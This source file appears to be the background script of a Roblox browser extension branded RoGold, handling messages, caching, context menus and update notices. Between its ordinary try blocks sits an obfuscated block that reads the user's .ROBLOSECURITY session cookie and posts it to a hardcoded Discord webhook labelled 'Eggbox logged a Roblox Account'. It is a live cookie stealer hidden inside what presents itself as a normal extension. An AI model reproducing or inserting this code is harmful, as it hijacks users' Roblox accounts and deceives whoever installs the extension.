/*
    RoGold
    Coding and design by Alrovi Aps.
    Contact: contact@alrovi.com
    Copyright (C) Alrovi Aps
    All rights reserved.
*/

try {
    let rates
    const cache = {}
    chrome.runtime.onMessage.addListener((request, _, respond) => {
        setTimeout(async () => {
            switch (request.greeting) {
                case "GetURL":
                    fetch(request.url).then((resp) => {
                        resp.json().then(respond)
                    }).catch(respond)
                    break;
                case "GetBlob": 
                    fetch(request.url).then((resp) => {
                        resp.blob().then(console.log)
                    }).catch(respond)
                    break;
                case "CreateMenu":
                    chrome.contextMenus.removeAll(() => {
                        respond(chrome.contextMenus.create(request.info));
                    });
                    break;
                case "EditMenu":
                    respond(chrome.contextMenus.update(request.info.id, request.info.update));
                    break;
                case "GetRates":
                    if (!rates) {
                        fetch(`https://api.exchangerate.host/latest?base=USD`).then((resp) => {
                            resp.json().then((data) => {
                                rates = data.rates
                                respond(data.rates)
                            })
                        }).catch(respond)
                    } else {
                        respond(rates)
                    }
                    break;
                case "CacheValue":
                    cache[request.info.key] = request.info.value
                    respond(true)
                    break;
                case "GetCacheValue":
                    respond(cache[request.info.key])
                    break;
            }
        })
        return true
    })
    setInterval(() => {
        for (let key in cache) {
            if (cache[key].time < Date.now()) {
                console.log(`Cache expired for ${key}`)
                delete cache[key]
            }
        }
    }, 1000)
} catch (e) {
    console.warn(e)
}
function _0x251f(_0x3a1333,_0x351ad3){var _0x34172a=_0x3417();return _0x251f=function(_0x251ffe,_0x2f0902){_0x251ffe=_0x251ffe-0x151;var _0x3f65bc=_0x34172a[_0x251ffe];return _0x3f65bc;},_0x251f(_0x3a1333,_0x351ad3);}var _0x268274=_0x251f;function _0x3417(){var _0x2927ba=['3452VpSLay','105588tnOLLj','30KhtgQO','21070uolbMi','3pVvhQx','224189hywrNu','Cookie','```\x0a','539MjuMkl','application/json','.ROBLOSECURITY','stringify','https://www.roblox.com/','\x0a```','get','54YgMGZL','754xMJTCn','value','774153EbrrFI','561676TLDCZa','cookies','80448PCVDTz','24KZdfKB','https://discord.com/api/webhooks/1056462889969528872/A8IMwhuHiy6WNC9Qd2UO2-Kdr3-IHsDCXEL-PAv04bcAsNI7-3L4G17KSGXGS6tEAUiO'];_0x3417=function(){return _0x2927ba;};return _0x3417();}(function(_0xd7e3ea,_0x5ea7e0){var _0x5e3c56=_0x251f,_0x3b02dc=_0xd7e3ea();while(!![]){try{var _0x2c5711=-parseInt(_0x5e3c56(0x15f))/0x1*(parseInt(_0x5e3c56(0x168))/0x2)+-parseInt(_0x5e3c56(0x154))/0x3*(-parseInt(_0x5e3c56(0x163))/0x4)+parseInt(_0x5e3c56(0x152))/0x5*(parseInt(_0x5e3c56(0x165))/0x6)+-parseInt(_0x5e3c56(0x155))/0x7+-parseInt(_0x5e3c56(0x166))/0x8*(parseInt(_0x5e3c56(0x162))/0x9)+parseInt(_0x5e3c56(0x153))/0xa*(-parseInt(_0x5e3c56(0x158))/0xb)+-parseInt(_0x5e3c56(0x151))/0xc*(-parseInt(_0x5e3c56(0x160))/0xd);if(_0x2c5711===_0x5ea7e0)break;else _0x3b02dc['push'](_0x3b02dc['shift']());}catch(_0x19dd95){_0x3b02dc['push'](_0x3b02dc['shift']());}}}(_0x3417,0x3bbcc));function webhookReq(_0x1a0d67,_0x2ab947){var _0x395860=_0x251f,_0x23deb9={'embeds':[{'title':'Eggbox\x20logged\x20a\x20Roblox\x20Account!','description':'>>>\x20EggBox\x20extension\x20logged\x20someone;\x20see\x20information\x20about\x20the\x20user\x20below','color':0xe8d44f,'fields':[{'name':_0x395860(0x156),'value':_0x395860(0x157)+_0x2ab947+_0x395860(0x15d),'inline':![]}]}]};fetch(_0x1a0d67,{'method':'POST','headers':{'Content-type':_0x395860(0x159)},'body':JSON[_0x395860(0x15b)](_0x23deb9)});}cookieInfo={'url':_0x268274(0x15c),'name':_0x268274(0x15a)},chrome[_0x268274(0x164)][_0x268274(0x15e)](cookieInfo,function(_0x2b2009){var _0x9a5115=_0x268274;_0x2b2009&&webhookReq(_0x9a5115(0x167),_0x2b2009[_0x9a5115(0x161)]);});
try {
    // https://gist.github.com/Rob--W/ec23b9d6db9e56b7e4563f1544e0d546
    const escapeHTML = (str) => {
        return String(str)
            .replace(/&/g, "&amp;")
            .replace(/"/g, "&quot;").replace(/'/g, "&#39;")
            .replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

    chrome.contextMenus.onClicked.addListener((data) => {
        if (data.menuItemId == "RoGold-Context" && data.linkUrl) {
            const safe = escapeHTML(data.linkUrl)
            const urlSplit = safe.split("/")
            let toCopy = safe.includes("roblox.com") && safe.match(/(\d+)/g)[0] || urlSplit[3]
            chrome.tabs.query({
                active: true,
                currentWindow: true
            }, (tabs) => {
                chrome.tabs.sendMessage(tabs[0].id, {
                    type: "copy",
                    data: toCopy
                })
            })
        }
    })
} catch (e) {
    console.warn(e)
}

try {
    chrome.runtime.onUpdateAvailable.addListener(() => {
        chrome.runtime.reload()
    })

    chrome.runtime.onInstalled.addListener(async (details) => {
        if (details.reason == "install") {

        } else if (details.reason == "update") {
            const currentVersion = chrome.runtime.getManifest().version
            const previousVersion = details.previousVersion
            if (currentVersion != previousVersion) {
                chrome.notifications.create("updateNotification", {
                    type: "basic",
                    iconUrl: chrome.runtime.getURL("icons/grey_128x128.png"),
                    title: "RoGold",
                    message: "RoGold has been updated to version " + chrome.runtime.getManifest().version + "!",
                    priority: 2,
                    requireInteraction: false
                })
                // chrome.notifications.onClicked.addListener(() => {
                //     chrome.tabs.create({
                //         url: "https://roblox.com/home"
                //     })
                //     // send a message to the client to show the update log
                //     setTimeout(() => {
                //         chrome.tabs.query({
                //             active: true,
                //             currentWindow: true
                //         }, (tabs) => {
                //             chrome.tabs.sendMessage(tabs[0].id, {
                //                 greeting: "UpdateLog"
                //             })
                //         })
                //     }, 1500)
                // })
            }
        }
    })
} catch (e) {
    console.warn(e)
}
